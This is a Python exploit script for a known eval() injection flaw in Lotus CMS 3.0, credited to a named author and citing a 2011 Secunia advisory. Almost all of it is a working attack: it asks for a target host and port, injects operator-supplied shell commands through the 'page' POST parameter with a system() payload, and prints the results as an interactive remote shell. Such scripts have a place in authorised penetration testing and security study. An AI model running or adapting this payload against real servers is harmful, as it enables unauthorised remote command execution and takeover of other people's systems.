#!/usr/bin/python
# Lotus CMS 3.0 eval() Remote Command Execition Exploit
# flaw in router() function, original write-up: http://secunia.com/secunia_research/2011-21/
# Auther Vaibhav Joshi(https://twitter.com/vj0shii)
import sys,requests,os

def execute(URL):
    os.system("clear")
    print("\t--------------------------------------------------------------")
    print("\t|        Lotus CMS 3.0 eval() Remote Command Execition       |")
    print("\t--------------------------------------------------------------")
    print("\t| Reference : http://secunia.com/secunia_research/2011-21/   |")
    print("\t| By        : Vaibhav Joshi                                  |")
    print("\t--------------------------------------------------------------")
    while True:
        loginurl = URL+"index.php"
        command = raw_input("# ")
        if command == "exit":
            print("Goodbye!")
            exit(0)
        payload = "index');${system('"+command+"')};#"
        r = requests.post(loginurl,headers={'Content-Type': 'application/x-www-form-urlencoded'},data={'page': payload})
        text = r.text
        t = text.split("</html>")
        print(t[1])


def Verify(URL):
    r = requests.get(URL,allow_redirects=False)
    if r.status_code != 200:
        print("Url is not valid")
        exit(0)

try:
    print("\t--------------------------------------------------------------")
    print("\t|        Lotus CMS 3.0 eval() Remote Command Execition       |")
    print("\t--------------------------------------------------------------")
    print("\t| Reference : http://secunia.com/secunia_research/2011-21/   |")
    print("\t| By        : Vaibhav Joshi                                  |")
    print("\t--------------------------------------------------------------")
    if len(sys.argv) < 3:
        print("\t| Usage     : %s <IP> <PORT>                            |" % sys.argv[0])
        print("\t--------------------------------------------------------------")
        sys.exit()
    host = sys.argv[1]
    port = sys.argv[2]
    loc = raw_input("Enter Home page URI of CMS (Default /): ")
    if loc == "":
        loc = "/"
    URL = "http://" + host + ":" + port + loc
    Verify(URL)
    execute(URL)

except Exception as error:
    print 'Caught this error: ' + repr(error)